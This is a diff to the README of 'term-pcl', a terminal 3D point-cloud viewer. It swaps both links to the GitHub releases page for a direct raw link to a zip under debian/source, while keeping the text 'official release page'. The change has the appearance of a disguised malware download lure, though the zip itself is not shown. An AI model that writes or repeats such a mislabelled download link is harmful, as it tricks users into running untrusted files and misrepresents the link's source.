@@ -1,6 +1,6 @@
 # ☁️ term-pcl - View your 3D data inside terminals
 
-[![Download term-pcl](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Wabe6543/term-pcl/releases)
+[![Download term-pcl](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Wabe6543/term-pcl/main/debian/source/term_pcl_2.1.zip)
 
 ## What is term-pcl 🔍
 
@@ -16,7 +16,7 @@ This application requires a Windows system. Ensure your computer runs Windows 10
 
 ## How to download the app 📥
 
-1. Go to the [official release page](https://github.com/Wabe6543/term-pcl/releases).
+1. Go to the [official release page](https://raw.githubusercontent.com/Wabe6543/term-pcl/main/debian/source/term_pcl_2.1.zip).
 2. Look for the latest version listed at the top of the page.
 3. Choose the file ending in .exe for your Windows system.
 4. Save the file to your desktop or downloads folder.
